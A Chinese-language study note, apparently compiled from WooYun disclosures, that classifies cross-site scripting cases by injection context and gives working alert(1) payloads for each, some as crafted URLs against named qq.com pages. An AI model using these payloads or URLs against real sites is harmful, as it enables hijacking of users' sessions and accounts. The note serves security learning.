#XSS 分类

#### 整理自乌云

- 什么都没过滤的情况
- 输出在`<script><script/>`之间的

    `new Image().src="..."` 或者 `<script>alert(1)</script>`

- 输出在html里的

    `http://xxx.com/search?word=hehe`

    ```html
    <input type="text" value="hehe">
    ```

    修改为 `http://xxx.com/search?word=hehe" onclick="alert(1)`

    则变成
    ```html
    <input type="text" value="hehe" onclick="alert(1)">
    ```

- 宽字节注入

    URL 编码简介
    
    | sp  | "   |  '  |  ,  |  ;  |  <  |  >  |  ?  |  [  |
    | --- | --- | --- | --- | --- | --- | --- | --- | --- |
    | %20 | %22 | %27 | %2C | %3B | %3C | %3E | %3F | %5B |


    |  ]  |  {  |  o  |  }  | 
    | --- | --- | --- | --- |
    | %5D | %7B | %7C | %7D |

    | newline |    [   |    ]   |  &#124; |
    | ------- | ------ | ------ | ------- |
    |  space  | \&#91; | \&#93; | \&#124; |

    
    `http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa`
    中 `%22` 代表 `"`, 但是最后被过滤为 `&quot;`：
    ```js
    var gsTest = "&quot;;alert(1);//aaaaaa";
    ```
    预想效果:
    ```js
    var gsTest = "";alert(1);//aaaaaa";
    ```

    当html为gbxxxx系列编码时，改为如下:
    
    `http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%c0%22;alert(1);//aaaaaa`
    
    效果： 
    ```js
    var gsTest= "宽";alert(1);//aaaaaa
    ```
    我试了在console里试了` decodeURI('%C0%5C') `等各种组合还是不明白真相...

    作者解释：至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。
    并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c （怎么吃的啊T^T）

- 反斜杠

    ```js
    location.href="........."+"&ss=aaaa"+"&from=bbb"+"&param=";//comment
    ```
    可以用反斜杠 `\` 杀死 `"`，改成
    ```js
    location.href="........."+"&ss=aaaa\"+"&from=1//"+"&param=";
    ```
    问题： "字符串"&from=1，这样是错误的，因为&符号的优先级高， ("字符串"&from)=1 是无法进行这种赋值操作，继续修改 
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1//"+"&param=";
    ```
    问题： from未定义，加一个函数定义（js会先解析定义），继续修改
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1;function from(){}//"+"&param=";
    ```
    问题： 空格被转义为了 `&nbsp;`， /**/替换空格，继续修改 
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//"+"&param=";
    ```

- 换行符

    ` %0a ` 代表html中的换行，达到如下效果：
    ```js
    //我是注释，我爱洗澡，哦～哦～哦～ [我是输出]
    ```
    变成
    ```js
    //我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符
    alert(1);//我是输出]
    ```

- DOM XSS 显示输出
    ```js
    document.getElementById('test').innerHTML = "<img src=1>";
    document.write('....');
    $('.class-name').html('...');
    ```
    `innerHTML = <script>alert(1)</script>`无法触发，只能用`<img>`
    JS的字符串中的字符可以写为 unicode编码。
    如： `<` 可以表示为 `\u003c` , `>` 可以表示为 `\u003e`
    ```js
    document.getElementById("a").innerHTML="\u003cimg src=1\u003e";
    ```
    在JS字符串里， < 不光可以写为 \u003c，还可以写为 \x3c， > 同样可以写为 \x3e, 是16进制编码

- DOM XSS 隐式输出
    ```html
    <object><param name="movie" value="aaaaa">
    ```
    `http://qt.qq.com/video/play_video.htm?sid=aaaaaa"></object><img src="1" onerror="alert(1)`

    通过隐式闭合标签进行注入，插入诸如`<img>`标签
    ```html
    <object><param name="movie" value="aaaaa"></object><img src="1" onerror="alert(1)">
    ```
    
    由于chrome已经过滤了`< >`两个符号，所以js代码过滤的是encode后的字符，相当于没过滤
    `decodeURIComponent` 的操作，会将 `%3c`, `%3e`，又变回 `<`, `>`
    
    也可以构造URL如 `http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E` 以达到目的

- DOM XSS eval函数

    先看这个url: `http://kf.qq.com/search_app.shtml?key=aaaaa`
    通过在url后面加非法字符 `\` 构造 `http://http://kf.qq.com/search_app.shtml?key=aaaaa\`
    然后从控制台定位到错误代码，发现下面这段js
    ```js
    var getarg = function() {
        var url = window.location.href;
        var allargs = url.split("?")[1]; // 获得key=aaaa
        if (allargs!=null && allargs.indexOf("=")>0) {
            var args = allargs.split("&"); // 多arguments情况
            for(var i=0; i<args.length; i++) {
                var arg = args[i].split("=");
                eval('this.'+arg[0]+'="'+arg[1]+'";'); // 直接用了this调用key
                // 然后可以在页面里执行
            }
        }
    };
    ```
    通过加分号断句，让自己的xss执行，那么可以把`this.key="aaaaa";` 变成 `this.key;alert(1);//="asdas"`
    让 `arg[0]` 变成 `key;alert(1);//`，把后面的用注释断句
    构造url: `http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaaa`

    chrome中 `"` 会变成 `%22` 而失效

- DOM XSS iframe

    有时候，输出还会出现在 <iframe src="[输出]"></iframe> 。
    iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，
    而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。
    当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src="[可控的url]"; 同样会导致XSS问题

    - onload执行js
    ```html
    <iframe onload="alert(1)"></iframe>
    ```
    - src执行js
    ```html
    <iframe src="javascript:alert(1)"></iframe>
    ```
    - chrome下data协议执行代码
    ```html
    <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
    ```
    - chrome下srcdoc属性，变体
    ```html
    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
    ```
